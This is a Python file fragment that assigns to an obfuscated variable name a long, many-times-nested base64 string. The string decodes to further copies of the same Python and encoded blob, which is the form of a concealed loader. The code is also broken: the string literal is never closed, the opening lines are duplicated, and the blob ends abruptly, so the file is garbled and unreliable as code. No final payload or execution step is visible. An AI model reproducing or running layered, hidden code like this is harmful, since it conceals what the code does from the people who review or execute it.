import base64
oOO0oooOO = "import base64
oOO0oooOO = "aW1wb3J0IGJhc2U2NApvT08wb29vT08gPSAiYVcxd2IzSjBJR0poYzJVMk5BcHZUMDh3YjI5dlQwOGdQU0FpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0haVU1EaDNZakk1ZGxRd09HZFFVMEZwVTFoc1FtUkZkSEJOUjJSYVRXcHNjbGxXWXpGaWF6bHdVV3BHYTFJeGJEQlVNRTVDWkVWMGNFMUZkRXBsVlZKRVkxWk9RbVZWTVVWUlZFSk5Wa1ZzTTFSVlVuSmFNVnBJWWtoV2JGVXdTbFZXVlZwTFZGVnNSRnA2YUdoVFJrbDNXVEJTZG1ScmQzcFZia0pwWW0xME1WZFhNVlpMTUhSVVRrVjBTbVZWVWtSalZrNUNaVlV4UlZKVVJrcFNWVnAxV1Zaa05HSkZiRVpUYWtacVRXMTRNVmRzYUU5bGEyeEdXa2hzYVUweFdqTlRWVkkwWWpKU1NWVnVaRkJoVkdneVdrUk9hMDB3ZUhSU2JUVm9Wak5vYzFkWE1XcGtWbXQ1VDFoU1VWb3lPWEZUVlRGTVkwVnNSVk5ZWkU1V1JteHVWV3BPUzAxWFRraFBSMlJUVm1zMVVWVlliRU5UYlVwMFdrZDRhV0pYZUhOWk0wNVFaRVpzVkZGdGRHRlZNRXBWVjJ4b1MwMXRSbGhVYmtKcFRUQXhlbE5WV2s1a1ZsSkVUbFphVFdGVlJqQlRWVlozWVVkR1dWTnVXa3BTV0doNldXcE9RMk5IVGpOaU1uQktVbGhvZDFkVVNsZGtWMDE1Vmxka1VsWlhVbEpXUlUxM1pXdDRjVkZYWkdsTk1HeHVXV3RrUjAxR2NGbFRWMlJNVWpKbmQxcEZhRUpPYTNnMVQxUk9hMDB5VGpGWGFra3hUVlY0ZEU5WWJHRmxWR3g2V1Zaa1QySkhTblZVYlhocVpWUnNkVmt3WkROa1YwWkpWVzVTYVZFeWRERlJNbVIzWTBkS1dWRnVXbXBpYkVadVdXcE9UbE15UmxoTldHUnBUVEJ2ZDFOVmFFOWlNbEpaVlc1Q2FWRllRbmRaYkdoRFpHMU9kVlZYWkd0VFJYQnZWMVJLVjJGV2JGaFVia3BFWWxad05WbHFTWGRhTVd0NVQxaFdhMUl4V1RCYVJXUTBZMFpzY0ZGdVFtbFhSVW95V1RJMVVsb3hhM2xQV0ZaclVqRlpNRnBGWTNoaFIwcDBVbTAxWVZkRmJFeFhiVFZMWkcxS1ZGRnRkRnBYUmtweldrVmtjMlJHY0ZSUmJrSnBWMFZLTWxreU5WSmFNWEJJVW1wQ1lWZEdTbmRaYkdSV1l6QnNTVlZ1UW1sV01WcHlWMnhrTkUxR2JGSmpSekZxWWxSc01GTlZaR3RqTWtsNVUxZGthRlo2UmpOWmFrNUxUVVZzU0dKSE5XbFNlbXh3VVRJeFlXVlhTWGxOUjJScFRUQktjMWx0TVZkbFYwNUVVVzVDYVZkRlNqSlpNalZTV2pGd1dXRkhjR0ZYUlVsM1dWWmpOV1JYVGpWa01tUnBWbnBzY2xkc1pEUmxhM2hFVVcweGFGWXhXbnBYYTJoT1l6QnNTRkp1WkdoVk0yUnVWMGhzTTFveVVraFBXRnBwVTBVeFRGZHROVXRrYlVwVVVXNWFhbEl4V2pGWGJHaExaREI0ZFZSdGVHcGliSEIzVjFSS1Zsb3lSbGhOV0dScFRUQnZkMU5WWkZOaFZVNTBZa2hTYWxKNmJEVmFSVTVEWXpKSmVWcEhOV2hXZWxaMVVUSjNOV015U1hsYVJ6VmhWMFZzYmxWR1RrTmpNa2w1V2tjMWFGWjZWblZVUnpGcllrZFNSbVZJV21GTmJWSnpXVEpzYjFwc1ozbE9WMmhwVmpGYWJWZEliSEpUTWxKSlUycFdVRm95T1c1VFZVNUNXakpHV0UxWVpHbE5NRzkzVTFWb1EwNVhUWGxYYWtKcVVWaENjMXBWWkU5aVIwNUpWVmRrVkZaNlJqTlphazVMVFVaS1dWTnViR2xOTUdzeVUxVk9RbUZyYkVsUmJteGFWakpTTUZkV1VuWmFNa3AwVDBka1drMXFhM2xYYkdoS1V6QnNSRkZYWkVwU2FteDZXV3BLYTJKc2NGbFRXRlpoVWpGYWNGcEdaR3BpTUc5M1ZHMW9hV0pVVmpKYVJVNURZMGRLV1ZGdVdtcGliRVp1V1RCb2MyVnNjSFZWYm1STFpWZDBURkV5WkhkaGJVcElVbTV3YW1WVlNrWlhWM1JMWVVacmVXUkVSbXBSTW1nd1dXcEtVMkpIU2tsVVdGWlZWbnBzY2xkc1pETmpSVGx1WWpKa1NsRXdSbTVYUkVreFlVZEtXRlpYWkZGVk1FWjFWMnRrU21SV2JIUlNiWEJvVFRGYU0xTnVaSFpUTUd4RVVWZGtTbEpxYkRaWk1XUTBXbXhyZVU5WVZtcE5NVW8xVjFaa2MyUlhVa2xVVjJSUlZUQkthVkV5YkVKYU1HeEVVVmRrU2xFd1JtNVRNRTVMWkZac1dFMVhlRmxOTVZveFdWWm9SMDFXY0ZSVFdFNUtVVEJ3VjFaSGRITlZiRnBXVmxjNWFXSlZXakJYYkU1eVlWVjRSRkZYYkZKTmExb3hXVzB3TlUxRmJFaFZha1pxVWpOb2QxZFVTa2ROUm5CVVVXMW9TbEl3TlRKWmJURmhZMFp2ZWxadWJGcFhSa3AzV1dwSk1HUlZiSEJoTTA1RVlWVkdibE5WVGtKYU1HeEVVVmRrVEZFd2NISlhWbWh6Wld4bmVsVnVXbGxOYmxKelYyeG9RMXB0VGtoUFdIQm9WMFpLZDFwSE1WWmhWWGhFVVZkc1VrMUhhRWRWVkVKNllqRndTRkpxVm1wTlZHdDNXV3BGTldOc2NGaFdibVJLVWtSUk5WTlZVa0pqUld4d1pEQjBTbEV3Um01VFZVNUNXakJzUkZGWFpFcGhNblJ1VjFSS1IyUlhTblJQVkVKS1UwVndjMWxzWXpWTmJIQlVVVzFzV2xZd05YbGFSbWhEWld0c1NGZHViR2xOYWtKdVdrVmtiMkpGYkVoWGFrWnJVMFphTlZkc1RUQmFNVVpaVkc1S1NsSldTakpYV0d4RFlsZEplbE5YWkd0U01taHZXa1ZOTUdGVmRGUmtNSFJLVVRCR2JsTlZXWGRUTUU1d1VWZGtTbEV3U2pGWFZtTjRZa1ZzUlUxSFpHRmlWM2h6V1d0a1UyVnJlSEpVYlRsYVYwVnNkbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVplazVUWlZkR1dFNVhOVkZWTUhCUVYxWmplR0pGYkhCa01IUktVVEJHYmxOVlRrSmFNR3hFVVcxd2FVMXFSak5hUm1oVFlrWkNWRk50V2xwTmFtd3dXVEJvVjAxR2NGZFBXRlphVm5wR2MxTlhiRE5UTUd4RVVWZGtTbEV3Um01VFZVNURaVzFTU0U5WWJHRldSRVpXV1RJMVYySkZlRUppTW1SS1VUQkdibE5WVGtKYU1HeElZVWQ0YVZORlJUVlRWM2hQVFZkS1dFMVhhR3BpYlhSdVdXcEtXbG95VWtoaFNFSnFaVlZLY0ZkV1pFOWpiVkpaVVZka2FsTkZjREpYVkVwWFpXMU9OVk5ZVGtSaFZVWnVVMVZPUW1ORlRuQlJWMlJLVVRCS2RGbHFTalJoTVhCWlUxZGtVVlV3U25SWlZtUlhZekZ3U1ZSWVZsSk5iV2h2V1RKc2JsTXdiRVJSVjJSS1VUQkdibE5WVGtOaE1YQllWMjFvYTFZelozZFZSbVEwWVVkS1dGTnRkRnBWTUVvMlYyeGtOR0pWT1hCUmJuQmhWak5vZEZSSGR6VmhNWEJZVjIxb2ExWXpaM2RYUkVwaFpHMUtTRlZ0ZUdwaFYyUjNWRVZHZGxvd2JFUlJWMlJLVVRCR2JsTlZZelZqTVhCSVRsZG9hVll4VlRWVFZ6RkxZMjFPUjA5WGRHaFhSV3h3VkVWR2Rsb3diRVJSVjJSS1VUQkdibE5WWkc5aVIwcEpVVlJzUzAxRlduQlpla2sxWXpKU1dWVnRlRXBUUlVwdldrVmtibG94Y0hSUFdHeEtVMFUwZDFscVRrdGpSMHAwV1RKa2ExSXlhSE5UVldSTFlVWnJlV1JFUm1wVFJURjFWRVZHZGxvd2JFUlJWMlJLVVRCR2JsTlZhRXRpUjA1WlZtNUNhbUpXV25KVlJscFRaVmRTV0ZaVmRFcFJNRVp1VTFWT2NsTXdiRVJSVjJSS1VqRktiMXBXYUU5YWJWSklUMWRhYUUxc1duTlpNRTVDVDFWc1NGZHVRbUZXTTJoeVdUTnJNVk50U25WVmJYaGhUV3hhTlZNd1JuWmFNR3hFVVZka1NsRXdSbTVUVldNMVl6RndTRTVYYUdsV01WVTFVMWN4VTJGSFZsbFVha0pwVFc1U2MxZHNhRUpoVlhoQ1lqSmtTbEV3Um01VFZVNUNXakJzU1ZOdGVHcFhSbHAzV1RJeFYyRXhRbGRWYm14clZqRldlbEV5YkVKYU1HeEVVVmRrU2xFd1JtNVhhMlJYWWxac1dWWnVUbXRTUkVJelZFVkdkbG93YkVSUlYyUktVVEJHYmxOVlpHOWlSMHBKVVZSc1NtRXdjRzlYVkVvd1RWZE9TVlJYWkdsTmJtaHlWMnhvU2xveVVraGhSMmhwWVZWSmQxbFZaSE5sYTJ4SldraENhVkl6Wkc1WFZ6RldXakZ3U0ZadVRtRlhSa3B6VjJ0T1EyRkhVbGxWYmxwcFZqQlpkMWxXWkU5aFIwcElaVVJXVFdGVlJuQlJNbXhDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyeFdUV3haZDFOVlVrSmFNbEpJVDBka1lWSXllRFpYVm1STFl6RndWRkZ0YUd0WFJrb3lWMnRrVjJNeGNGbFZia0pwVFdwU01WTlhiRE5UTUd4RVVWZGtTbEV5ZEV4VFZVNUNXakJzU0UxWGVHdFNNbWd5VjJ0T1FrOVZiRWhYYmtKaFZqTm9jbGt6YXpGV1JuQllaVWQ0V2sweFNuZFpha2t3WWpCT2NGRlhaRXBSTUVadVUxVk9RbG95VFhsV2JrNWhWakEwZDFsV1l6VmtWa0pYWXpJNVNtSllhREpYVkVwSFl6QnNjR1F5WkVwaE0yZ3lWMVJLUjJNd2JFaFZia0pxVFc1T2NGTXhUak5hTUhSRVUyNXdZV0pzU2pOVFYyd3pXakJzYzFOdGVHbFdlbXQzVjJ4T1ExWkdTbk5WYkVaS1UwVTFjMWt5TldGaVIwNXdVMWhDV1ZVelpFeFRWVTVDV2pCc1JGRlhaRXBSTUVweVYyeGtZV0ZIVWxobFJFSlJWVEJ3ZWxscVNrOWhSMHBFVTFoT1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkdoU01WcDZXVEJSZDJGV1JYbGhTRnBwVFRBMWMxTlZhRk5pTVhCVVVXNXdhMUo2YkRWWFZtUnJZa1ZzU0UxWGVHdFNNbWd5VjJ0T1EySlhTWHBUVjJSclVqSm9kMWt6YkVOaFZteFlWRzVLYTFkRlJqRlRWMnd6VXpCc1JGRlhaRXBSTW5STVUxVk9RbG93YkVsVWJURnJVMFZLYlZsVll6VmxiVkpFVVZSc1NsSXhjSGRYYkdRMFlUSk9OVTVWVW1oU01GbzFVekJHZGxvd2JFUlJWMlJLVVRCR2JsTlZhRTlOUjA1MFlraFdZV1ZxUW5WV1ZFSmhWbFpXUkZGc1VtRlhSVzk1VjJ4b1NtSnJlRUppTW1SS1VUQkdibE5WVGtKYU1HeElUMWhPWVZKNlZtOVpiR1JXVDFWc2RWUnRNV3RUUlVwM1dUQk9TbU13VG5CUlYyUktVVEJHYmxOVlRrSmFNa1pJVm01T2FsSkVRblpSTW14Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlRiRlpvVWpGV2JsbFZZelZsYlZKRVVXNVdXbFo2Um5OVFZXTTFaVlZzUm1KR1JrcFNNRnB5VjJ0b1MySkhUWHBVVjJSaFltdHdNbGxzVGtOT1YwbDZWbTVzU2xORmNITlpiR00xVFVad1ZGTlZkRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOWGJFTmxiSEJaVTJwS1lWZEZiREZUVlZaaFpHMU9jRkZ0ZUd4U01Gb3dXVEJrTkdKRmJFVlNWRlpPWVZSU05GUnRjRzVrVlRGRVRraG9TbG95T1c1VFZVNUNXakJzUkZGWFpFcFJNblJNVTFWT1Fsb3diRVJoTUhSS1VUQkdibE5WYUU5aVYxSkpVVzFhYWxKNmJEVmFSVTVDVDFWc1NGZHVRbUZXTTJoeVdUTnJNVk50U25WVmJYaGhUV3hhTlZNd1JuWmFNR3hFVVZka1NsRXdSbTVUVldoUFRVZE9kR0pJVm1GbGFrSndWbFJDWVZaV1ZrUlJiRVpwVFRCdmQxTlhiRE5UTUd4RVVWZGtTbEV3Um01VFZVNURZVEZ3V0ZkdGFHdFdNMmQzVlVaU1NtVlZlRUppTW1SS1VUQkdibE5WVGtKYU1HeElUMWhPWVZKNlZtOVpiR1JXVDFWc2RWUnRNV3RUUlVveldXcE9TMDFGYkhCa01IUktVVEJHYmxOVlRrSmFNR3hFVVcwNVlWWXphRE5WUms1TFZsZEdTRlpYWkdwU2VtdzFXa1ZPUTJSdFNuQlJha0pvVWpGV2JsVnRlRk5WVld4SlZHMTRhbUpzY0hOWk1teERUVWRHU0ZKcVFrcFNNRnB4VjFSS1YyUXlVa2xVVjJSV1RWVTFTbFJFUms5U01WcEhVVmRrV2sxclducFphMmhPWkZWc2JtSXlaRXBSTUVadVV6RkdkbG93YkVSUlYyUnFUV3h2ZDFrd1dUVk5WMDE1Vm01c1NsSkVRbTVYYlRGellrZEtTRlZ1Y0UxaE1EVjJWMVpvU21Jd1RuQlJWMlJLVVRCR2JsTlZUa0phTWsxNlZXNXNhRlo2Vm5WVlJrNXJWbTFOZVZadWJHbGlWVm93VjJ4T1EyTkhTbkJSYWtKb1VqRldibFpVUW1GV1ZsWkVVV3hTWVZkRmIzbFhiR2hLWW10NFFtSXlaRXBSTUVadVUxVk9RbG93YkVoUFdFNWhVbnBXYjFsc1pGWlBWV3gxVkcweGExTkZTWGhaZWtwWFpWZEtkRkp1VW1GVk1HeDZVVEpzUWxvd2JFUlJWMlJLVVRCR2JsbFZaRmRqTWs1RlRVYzVSR0ZWUm01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1MxWlhSa2hXVjJSclYwVTFjMWt5TURGaFIwcFlWbGRrYTAxdGFITlpNakZXV2pKU1NHRkhlRXBTYXpWSVZtdGFRbG94YTNsUFdGWnBZbFphY1ZwRlpITmtiVXB3VVZkc1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUzJWdFJraFBWRVpwVWpGR2JsZFhNVlphTWtwWVVtMTBZVlV3U1hwWlZtaFRZakI0Y0ZGc1ZtaFNNbmcyVTFWa2MyVnJiRWxWYlRsaFZUQkplRmw2U2xkbFZXeElUMWhXU2xOR1NuWlhiRTVEWWtkV1NWVnRlR3BpVkZadldXdE9RMlZzY0ZsVGFrcGhWMFZzTVZOWFpIWmFNR3hFVVZka1NsRXdSbTVUVlU1eVV6QnNSRkZYWkVwUk1uUk1VMVZPUWxvd2JFbFViVEZyVTBWS2JWa3daRWRsYlUxNldraGFhbUpXUm01VlJrNURZbGRHV0ZadVRtRlRSVEV4VlZSS2IyRkhUbkJhTUhSS1VUQkdibE5WVGtKYU1HeEVVVzV3YTFORmNIZFpiVEZxVDFWc2MxUnJaRmRTYTBadVZsVmtSMlZ0VFhwYVNGcHFZbFpHY0ZSRlJuWmFNR3hFVVZka1NsRXdSbTVUVldNMVl6RndTRTVYYUdsV01WVTFVMWMxVDJKWFVrbFJibVJhVjBVMU5scEVTVFZsVm5CRVUxaE9SR0ZWUm01VFZVNUNXakJzUkZGWFpHaFNNVnA2V1RCUmQyRldXa2hoUjNoS1UwVktiMWw2VGs5Tk1rbDZVMjEwU2xJeGNESlpNbXhEVFVkR1NGWlhaRlpOUm5CV1ZsVk9RMkZ0U1hsT1dGWmhWakEwZDFsV1l6VmtWWGh3VVd0d1lXRlZTVEZaYWs1V1dqSk5lbEZ0ZUZwTmJYaDBXbFpPUTJGRmJFbFJibXhvVjBad2IxcEZaRlphTUd4dVlqSmtTbEV3Um01VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFjeE1HSkhWbFJSYlRGb1ZqTm9jMVJGVGtOTlIwWklWbTVXU2xOR1NuWlpWbWhPV2pKR1dWUlhaR3RTTW1oelUxVm9RMkZIVFhwVWFrNXBUVEJ3Y2xOVmFGTmthMnhJVlcxNFdrMHdiekZaTUdoU1dqSkdXVlZZVmtwaFdHUk1VMVZPUWxvd2JFUmhNSFJLVVRCR2JsTlZhRTlpVjFKSlVXMWFhbE5GY0hkYVJ6RkhUVVp3VjA5WVNtRlhSM1J1VlVaT1EySlhSbGhXYms1aFUwVXhNVlZVU205aFIwNXdXakIwU2xFd1JtNVRWVTVDV2pCc1JGRnVjR3RUUlhCM1dXMHhhazlWYkhOUmJteG9WMFp3YjFwRlpGWmFNa1Y1Vm1wV1NsSXphREpYVkVwSFRVZEdXRTlZVmtwaFdHUk1VMVZPUWxvd2JFUlJWMlJLVVRCS2RsZHNaRFJrTVVKVVUyeEdXbGRHU25aVFZXaFRaR3RzU1ZWdE9XRlZNRW96V1RJeGMwMXNiRmxWYlhoS1VqTlNjMXBXVGtOaVYwWllaVWQ0VFdGVlNsRlpiVEUwVGxWc1NWVnRPV0ZWTUVwUlYydGpOV1JyYkVsV2JuQmhWMFZzYmxsNlNtOWtiVkpZWlVkMFNsSXlhRzlhUnpGV1dqQnNibUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlhOVXRpUm14WVZWZGthbEl4V2pWWmJHUnpaVzFOZVdKSVdtbGlhekZ1VjIwd05XVlZiRWxWYlRsYVYwWkdibGR0TVhOak1YQlVUa2RzVFZGWE9XNVRWVTVDV2pCMFVtSXdkRXBSTUVadVUxVldRMkZIVGtoaE0xWnBWbnBzY2xkc1pETlRNR3hFVVZka1NsSXhTbk5YYld4RFdteHdTRlp0TVZwWFJscDZXa1ZaTldKWFNYbGxSM1JoVjBWc2RsbDZTbGRqTVhCd1lYcGFSR0ZWUm01VFZVNUNXakJzUkZGWFpFcGhWV3h3Vld0a1YySldiRmxXYms1clVUQkpkMWx1YkVOYU1XeElVMjFvV2sxdVVYaFpNR2hQV2pGc1JGRnRNV2xOYm1oeVYyeG9TbG95UmxoT1dIQm9WakZLYzFOVlpFOU5WMDUxVTIxNGFXSnNSbTVaZWtwWFpWZFNkRlp1YkVwU01VcHZXa1ZrUjJFeVJsbFRXRlpLWVZWc2NGRXliRUphTUd4RVVWZGtTbEV3Um01Wk1qRlhUVWRTV1ZOdVZrcFNlbXcyVkVjMVEyRkhVa2hhTTFab1lsUnNkMWx0Ykc1VE1HeEVVVmRrU2xFd1JtNVRWVTVDV2pCc1JGRlhaR3RTZW13eVdXdG9UbVJXYTNsUFdGWmhZbGQ0ZFZZemJFdGhNV3haVlcxb1dVMXNTbmRaTW14TFdrVjRRbUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2NGZFhNVWRoYlVWNlZtNWthbVZWYkhwUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWxVYlhocFVqRnNNVmRzWXpGTmEzaDBWRzVzVFdKV1NuQlpiVEZIWkVad1ZHRXdkRVJoVlVadVUxVk9RMUZXYkZsUmJrSk5ZbFJGZUZscmFGTmpSVTV3VVZka1NsRXdTa0pYVm1oRFkwVjRkRlZ0ZUdwU01Wb3hWMnRvVG1Jd2JIUlhibHBwVWpGS2Mxa3liRXBqTUd4RVUyNVNZVmRHU25aWmFrcFNZVlY0UkZGWGJHcE5iRzkzV1RCWk5XSXlTWHBVYWtKS1lWaGtibE5YTlU5aVYxSkpVVzFhYWxKNmJEVmFSVTVLWXpCc1JGTnVjR0ZpYkVvelYwUk9WMlZzY0ZsVFYyeE1WVmM1YmxOVlRrSmFNWEJJVm0weFNsSnFiSEZaYWtsNFpESlNXVlZ0ZUZsTmFsWnZXV3hrVm1JeVRYbFdiazVoWVZkek1sRXliRUphTUd4RVVWZGtTbEV3Um01VFYyeEtZVlpKZVZacVFrcFRSa3AyVjJ4T1EyVlhSbGhhUnpsclVUQktObHBHWTNoa1JteFpVMnBXU2xJeGNESlpNbXhEVFVkR1NHSkljRXBTTTBJeVYxZHJNR0ZWYkhCVFZYUktVVEJHYmxOVlRrSmFNR3hFVVcweGFVMHdiRzVaTWpGWFlXdHNTR0pJVmtwVFJUVnpXV3RrV2s1clRuQlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEl5ZUhSVFZXaExZa1pzTlU1WVVtRlhSa3AyV1dwS1Vsb3hRbFZOUjJSS1lsaG9NbGRVU2tkak1HeHhZakIwU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVsVGJYaGFaVlJXTVZkV1kzaGlSV3hGVFVka1NtRldXalpUVlZaQ1dqSktTRTlYY0ZwV00yaDJXV3BPVDAxRmJIQlJWM2hLVTBWd2MxZFlhekZpVjBsNVpVZDBZVmRGYkV4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3hjRmhsU0VKaFlWVktOVmRzWkU1a1YwcFlWbXBDYUZKNmJISlRWVkYzVDFWc1JGTnVjR0ZpYkVvelUxZHdkbE13YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVUVldoTFlrWnNOVTVZVmxwV2VrWnpVMVZSZDFvd2JIVlViVEZyVTBWRk1sUklhelJpUjAxM1VWZDRhbVZ0T1hOWGEwNVhaV3RzY0ZGWGVFcFJNbVJNVTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWVTVEWlZad1dGUllWbXBOYkc5M1dUQlpOVTFYVFhsV2JteE5VVEJLTlZkc1pFNWtWMDE1VjJwQ2FsSnFiSFpaYWs1UFRVVjRSRkZ1YkdGV01ERXhXWHBLWVUxSFRrZFBXR1JwVFRCdmQxUkZUa05sVm5CWVZGaFdZV0pVYkhwWGEyUlhaVlYwVW1Jd2RFcFJNRVp1VTFWV1EyRkhUa2hoTTFacFYwWmFlbHBGWkhKVE1HeEVVVmRrU2xKVlNtOVpNR1J5WkZacmVVOVlWbXBOTVVvMVYxWmtjMlJYVGpWYU1teGhZbFJzZWxkclpGZGxWV3h3WkRKa1NtSlVSbk5hUldSdlpHeHdSRk5ZUWtSaFZVWnVVMVZPUTJFeGNGaFhWMlJaVFdzMWRsZHNaRTlqYkdkNVYyNWFhVkl4U25OWk1teHZaV3h3V0dWSE1VeFdSemxNVTFWT1Fsb3diRVJSVjJSS1VUQkdjRk5YYkV0U1YwbzFVVzVXYVUweFJtNWFSbWhQWWtWc1NWVnRPV0ZWTUVwMFdWWmtOR0pIVFhwVmJscHFZbFpXYmxscVRrcGFNbFpZVDFSR1NsTkhVbmRaYTJReldqRnNkRkp0Y0doTk1Wb3pVMVZvYzJSdFVsbFRWMlJhWWxWYWNWbFVUbGRrTWs0MVRrZHNTbUZWYkV4VFZVNUNXakJzUkZGWFpFcFJNRXAwV1dwT1Nsb3lUalZSYmtKcFlWVktObGRzWkRSaVZUbHVZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVwM1YyMXNRbUl5VGpWT1dGSmhWMFpLZGxscVNsSmFNVUpWVFVka1NtSllhREpYVkVwSFl6QnNjRkZ0YUdsaVZrWk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNURaV3Q0ZEZkdVdtbFNNVXB6V1RKck1XVnRVa2hTYm14clUwVTBlbGxXYUZOaU1IUkNZakprU2xFd1JtNVRWVTVDV2pCc1JGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrTk5SMGw1VDFoT2FtVlVWbkZaYWtreFlsZEdXRmt6Vm1GaVYzaDZWMnhvVDAxSFNYcFRiWGhNVTBVMWMxbHJaRnBrVm5CWVRsUktUV0pWTlRWVVJ6RlRZVmRLZEZKdVVtRlZNblIzVXpGU2RsTXdiRVJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWV2hMWVVkR1dWUnRlRXBTTVZrd1YxUktWMlF5VWtoaVNGcHBZbXN4TVZadE1VZGpNa1pZVlcxb2ExSXllREpaYlhSWFpWZE9kRTlZYkV4UlZ6bHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Um01VFZWazBZakJzY2xWdVdrcFNlbFl5V2tWT1EyVnNiRmxYYlhoS1VqQndiMWRVU2pCTlYwNUpWRmRrYVUxcVVtNWFWbU0xVFZkT2NGRnRNV2hXTTJoeldYcE9VMlJ0VG5SV1dFNUtVbnBzTlZOVmFITmtiVkpVVVdwT2FGWXphSHBUVlU1S1V6QnNSRkZYWkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtTbEV3Y0hCWFZtUlBZMjFTV1ZGWFpHeFdlbXQ0V1RKc1EyRldiRmhVYmtwclYwVktObE5WYUZOa2JVbzFVbGRzVEZVeWRFeFJNbXhDV2pCc1JGRnJSbHBYUlVwM1ZFY3dlRTFYU2tsVmJrSkVZVlZHYmxOVlRrTmhNWEJZVjFka1dsWXdOSGRaVm1NMVpGWm5lbFJ0TVd0VFJVcHRXa1ZrVjJWdFVrZFBWM0JwVFdwV01WZHNaRTlOUjBaWVQxaFdURk5GTlhOWmEyUmFZMFU1Ym1JeVpFcFJNRVp1VTFWT1Fsb3diRVJUVjJ4S1lUQTFkbGRzWkU5amEyeElZa2N4U2xOR1NuWlhiRTVEVmtaS2MxVnNSa3BUUlRWeldrVm9VMk5IU25SYVNIQktVakJhTlZkc1RrTmhiVWw2VTI1c1lWWXdOSGRVUjJ4S1lWVnNibUl5WkVwUk1FWnVVMVZPUWxvd2JFbFZibXhzVmtjNVRGTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzTlZGcmRHdFhSVFIzVTFWak5XUXhjRmhPUjJSYVZucFdjbE5WWkU5ak1rbDZWRzE0U2xOR1NuWlhiRTVEWVcxSmVVNVlWbUZXTURSM1dWWmpOV1JWVG5CUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka1NsTkhVbmRhUldSdVdqSk5lVlp1VG1GaFZGWTJWMjAxVTJReFozbFVibHBwWWxSV2MxZFVUbE5qUjBsNVRrYzVURlpIT1V4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJSS1UwVndiMWxXYUU5aVJXeElWbXBTV2sxc1dqTmFSV1J6WkcxS2RWUllWbGROYTFvMVdXMHhjMlJXY0RWaFIxcE1VVEJ3UlZscVNURmtWbkJZVkdwQ2FGWjZiREZUVlZwVFlrZE5lbFZYWkZaTk1WcHhWMVJLVjJKR2NFaFdiWFJLVlRCc2QxTXhSblphTUd4RVVWZGtTbEV3Um01VFZXUlhUa1pyZVZadVpHdFJNRVoyV1RCb2MyVnNjSFZWYm1STllUQTFOVmRzWkZOaVIwcDFWVzVDV2xZemFFZGFWV1JQWWtkT1NWVnVRbWxOYWxKNlUxVm9RMDVYVFhsWGFrSnFVWHBXUlZscVNURmtWbkJZVkdwQ2FGWjZiREZWYkdodllXeHdXVkZxUW1oV2Vtd3hVekZTZGxNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGtXVTF1YURKWGFrcHJZa2RPY0U1WVFtbGlWbkF5VXpCT1MxSkhTWGxPV0ZaaFZqQTBkMWxXWXpWa1ZXeEhWVzE0YWsweFJtNVZiVEZIWTBkS1NGWnRkRXBWTUd4NlUxVmtWMDVHYTNoUFdFSnBZbFp3TWxWR1dsTmxWMUpZVmxoQ1JHRlZSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZvUzJGSFJsbFViWGhLVWpGWk1GZFVTbGRrTWxKSVlraGFhV0pyTVRGV2FrcEhaVmRLZEdKSVZtRmxWMmh0VXpCT1MxSkhTWGxPV0ZaaFZqQTBkMWxXWXpWa1ZXeEhWVzE0YWsweFJtNVZiVEZIWTBkS1NGWnRkRXBWTUd4M1V6RkdkbE13YkVSUlYyUktVbFZLYjFrd1pISmtWMHBaVm01T2ExSXlkRXhUVlU1Q1dqQnNTRlZ0ZUdGaFZVcHZWMVJPVTJOSFNYbE9WMXBhWWxWYWNWbFVUbGRrTUhSSlZHMTRhVkl4YkhkVU1tUjJXakJzUkZGWFpFcFJNRVp1VTFWT1NtRlZiSE5UYWtacFlWVktObGRzWkRSaVJtdDZWVzE0WVZFd1NuQlhWbVJQWTIxU1dWRnVjRTFoVld4d1UxZGtkbG93YkVSUlYyUktVVEJHYmxOVlpFdGhSbXQ1WkVSR2FsRXdSVFZUVlZVeFpHMUtkRlpWZEVwUk1FWnVVMVZPUWxvd2JFUlJiVEZvVmpOb2MxbHRNVWRrUm5CVVVWUnNTbE5GTlhOWmEyUmFaRlp3ZEdKSVRtRldlbFp2V1d4a1ZtSXhjRWhTYWtKaFYwWktkMWxzWkZaa1YwcDBUMVJPVEZFeWRIZFJNbXhDV2pCc1JGRlhaRXBSTUVadVdYcE9WMkZzYTNsV2JuQnFUV3h2ZUZsclRrSlBWV3hKVkcxNGFWSXhiREZYVnpWTFpHMVJlbFJ0ZUV4Uk1uUk1VVEpzUWxvd2JFUlJWMlJLVVRCR2JsTlliRU5XUjFKSVVtNXNhMUV3U1hwWlZtaFRZakJzU0dWSVdscE5hMXA2VTFWb1QwMUhTWHBUYldoaFRXeFdURk5WVGtKYU1HeEVVVmRrU2xFd1NuUlphazVLV2pKT2RGWnRjRXBTTW5neFUxVm9UMkpIU2toWFdGWmhZbGQ0